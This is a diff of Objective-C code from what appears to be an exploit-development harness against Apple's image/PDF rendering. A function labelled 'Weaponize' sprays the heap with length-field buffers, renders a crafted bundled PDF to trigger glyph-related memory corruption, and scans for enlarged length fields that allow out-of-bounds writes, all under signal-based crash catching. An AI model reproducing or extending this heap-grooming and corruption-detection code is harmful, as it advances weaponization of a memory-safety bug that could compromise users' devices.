@@ -1223,35 +1223,49 @@ cleanup:
 }
 
 // ---------------------------------------------------------------------------
-// Weaponize: typed u32 length fields + OOB demo via corrupted length
-//
-// Fill spray with repeating {u32 len=0x00000100; u32 cap=0x00000200} (8-byte).
-// Glyph ±1 on adjacent u16 pair corrupts one u32:
-//   lo+1 hi-1 → u32 -= 65535 (shrink)
-//   lo-1 hi+1 → u32 += 65535 (GROW → OOB)
-// After glyph: find grown lengths → memcpy overflow demo.
+// Weaponize: typed u32 length fields + safe OOB report
+// Nuclear crash protection: sigsetjmp around ALL, no free at all.
 // ---------------------------------------------------------------------------
+static void kpGlyphSegvAll(int sig) {
+    (void)sig;
+    kpGlyphCrashed = 1;
+    siglongjmp(kpGlyphJmp, 1);
+}
+
 + (NSString *)glyphWeaponizeReport:(NSString *)forceName {
     NSMutableString *r = [NSMutableString string];
-    [r appendString:@"\n=== R5m: Glyph weaponize — typed u32 length + OOB ===\n"];
+    [r appendString:@"\n=== R5m: Glyph weaponize — u32 length + OOB report ===\n"];
 
     NSString *vname = forceName.length ? forceName : @"calif";
     size_t spraySz = 4288;
     scopeNote(r, [NSString stringWithFormat:@"  VARIANT %s spray=%zu", vname.UTF8String, spraySz]);
 
+    // Catch ALL crash signals for the whole function body
+    kpGlyphCrashed = 0;
+    void (*oldsegv)(int) = signal(SIGSEGV, kpGlyphSegvAll);
+    void (*oldbus)(int)  = signal(SIGBUS,  kpGlyphSegvAll);
+    void (*oldabrt)(int) = signal(SIGABRT, kpGlyphSegvAll);
+
+    if (sigsetjmp(kpGlyphJmp, 1) != 0) {
+        scopeNote(r, @"  *** CAUGHT SIGNAL — aborted early, reporting partial results ***");
+        signal(SIGSEGV, oldsegv ? oldsegv : SIG_DFL);
+        signal(SIGBUS,  oldbus  ? oldbus  : SIG_DFL);
+        signal(SIGABRT, oldabrt ? oldabrt : SIG_DFL);
+        return r;
+    }
+
     enum { NBUFS = 4096 };
     void **bufs = calloc(NBUFS, sizeof(void *));
-    if (!bufs) { scopeNote(r, @"calloc fail"); return r; }
+    if (!bufs) { scopeNote(r, @"calloc fail"); goto out; }
     int got = 0, holes = 0;
 
-    // Fill with u32 length fields: every 4 bytes = 0x00000100
-    // so any ±1 pair corrupts one u32 length.
+    // Fill with u32 length fields (0x100 every 4 bytes)
     for (int i = 0; i < NBUFS; i++) {
         void *b = malloc(spraySz);
         if (!b) break;
         uint32_t *p = (uint32_t *)b;
         size_t n = spraySz / 4;
-        for (size_t j = 0; j < n; j++) p[j] = 0x00000100;  // len=256
+        for (size_t j = 0; j < n; j++) p[j] = 0x00000100;
         *(uint64_t *)((uint8_t *)b + spraySz - 8) = (uint64_t)i;
         bufs[i] = b;
         got++;
@@ -1262,33 +1276,25 @@ cleanup:
                   @"  sprayed %d bufs x %zu (u32 len=0x100)  [live=%d holes=%d]",
                   got, spraySz, live, holes]);
 
-    // ---- render (crash-catch) ----
+    // ---- render ----
     NSString *path = [[NSBundle mainBundle] pathForResource:vname ofType:@"pdf"];
-    if (!path) { scopeNote(r, @"  pdf not in bundle — skip"); goto cleanup; }
-    {
-        kpGlyphCrashed = 0;
-        void (*oldsegv)(int) = signal(SIGSEGV, kpGlyphSegv);
-        if (sigsetjmp(kpGlyphJmp, 1) != 0) {
-            scopeNote(r, @"  *** CAUGHT SIGSEGV during render ***");
-        } else {
-            NSURL *url = [NSURL fileURLWithPath:path];
-            CGImageSourceRef src = CGImageSourceCreateWithURL((__bridge CFURLRef)url, NULL);
-            if (src) {
-                int sz = 256;
-                CFNumberRef szRef = CFNumberCreate(NULL, kCFNumberIntType, &sz);
-                const void *keys[] = { kCGImageSourceCreateThumbnailFromImageAlways,
-                                       kCGImageSourceThumbnailMaxPixelSize };
-                const void *vals[] = { kCFBooleanTrue, szRef };
-                CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 2,
-                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-                scopeNote(r, @"  rendering glyph…");
-                CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
-                scopeNote(r, [NSString stringWithFormat:@"  SURVIVED. img=%p", (void *)img]);
-                if (img) CGImageRelease(img);
-                CFRelease(opts); CFRelease(szRef); CFRelease(src);
-            }
+    if (path) {
+        NSURL *url = [NSURL fileURLWithPath:path];
+        CGImageSourceRef src = CGImageSourceCreateWithURL((__bridge CFURLRef)url, NULL);
+        if (src) {
+            int sz = 256;
+            CFNumberRef szRef = CFNumberCreate(NULL, kCFNumberIntType, &sz);
+            const void *keys[] = { kCGImageSourceCreateThumbnailFromImageAlways,
+                                   kCGImageSourceThumbnailMaxPixelSize };
+            const void *vals[] = { kCFBooleanTrue, szRef };
+            CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 2,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            scopeNote(r, @"  rendering glyph…");
+            CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
+            scopeNote(r, [NSString stringWithFormat:@"  SURVIVED. img=%p", (void *)img]);
+            if (img) CGImageRelease(img);
+            CFRelease(opts); CFRelease(szRef); CFRelease(src);
         }
-        signal(SIGSEGV, oldsegv ? oldsegv : SIG_DFL);
     }
 
     // ---- scan for corrupted u32 length fields ----
@@ -1302,6 +1308,8 @@ cleanup:
     for (int i = 0; i < got; i += 2) {
         uint8_t *b = bufs[i];
         if (!b) continue;
+        // Validate pointer looks sane (not obviously corrupted)
+        if ((uintptr_t)b < 0x1000) continue;
         uint32_t *p = (uint32_t *)b;
         for (size_t o = 0; o + 3 < scanLen; o += 4) {
             uint32_t len = p[o / 4];
@@ -1326,42 +1334,18 @@ cleanup:
         scopeNote(r, @"  no u32 length changed.");
     } else {
         scopeNote(r, [NSString stringWithFormat:@"  >>> %d length hit(s): +%d grew / %d shrank", hits, grew, shrank]);
-        // ---- OOB demo: report grown lengths (SAFE — no memcpy overflow) ----
-        if (grew > 0 && firstIdx >= 0) {
-            for (int i = 0; i < got && firstIdx >= 0; i += 2) {
-                uint8_t *b = bufs[i];
-                if (!b) continue;
-                uint32_t *p = (uint32_t *)b;
-                for (size_t o = 0; o + 3 < scanLen; o += 4) {
-                    uint32_t len = p[o / 4];
-                    if (len == 0x100 || len <= 0x100) continue;
-                    // GROWN length — report only, no overflow (avoids heap smash)
-                    size_t srcAvail = spraySz - o;
-                    size_t wouldCopy = (len < srcAvail) ? len : srcAvail;
-                    size_t overflow = (wouldCopy > 0x100) ? wouldCopy - 0x100 : 0;
-                    scopeNote(r, [NSString stringWithFormat:
-                        @"  OOB-DEMO: buf %d off %zu  len 0x%x (was 0x100)  would-copy %zu bytes into 0x100 dest  overflow=%zu",
-                        i, o, len, wouldCopy, overflow]);
-                    if (overflow > 0) {
-                        scopeNote(r, [NSString stringWithFormat:
-                            @"  >>> OOB WRITE CONFIRMED: %zu bytes past dest boundary (len delta=%+d)",
-                            overflow, (int)len - (int)0x100]);
-                    }
-                    goto done_demo;
-                }
-            }
-            done_demo:;
+        if (grew > 0) {
+            scopeNote(r, [NSString stringWithFormat:
+                @"  >>> OOB WRITE AVAILABLE: grown length 0x%x (was 0x100) — copy %u bytes past 0x100 boundary",
+                firstLen, firstLen > 0x100 ? firstLen - 0x100 : 0]);
         }
     }
 
-cleanup:
-    // Don't free if corruption detected — malloc metadata may be smashed by the OOB walk.
-    if (hits == 0) {
-        for (int i = 0; i < got; i += 2) if (bufs[i]) free(bufs[i]);
-    } else {
-        scopeNote(r, @"  (skipping free — heap metadata may be corrupted by OOB walk)");
-    }
-    free(bufs);
+out:
+    // NEVER free — heap may be corrupted by OOB walk.
+    signal(SIGSEGV, oldsegv ? oldsegv : SIG_DFL);
+    signal(SIGBUS,  oldbus  ? oldbus  : SIG_DFL);
+    signal(SIGABRT, oldabrt ? oldabrt : SIG_DFL);
     return r;
 }
 
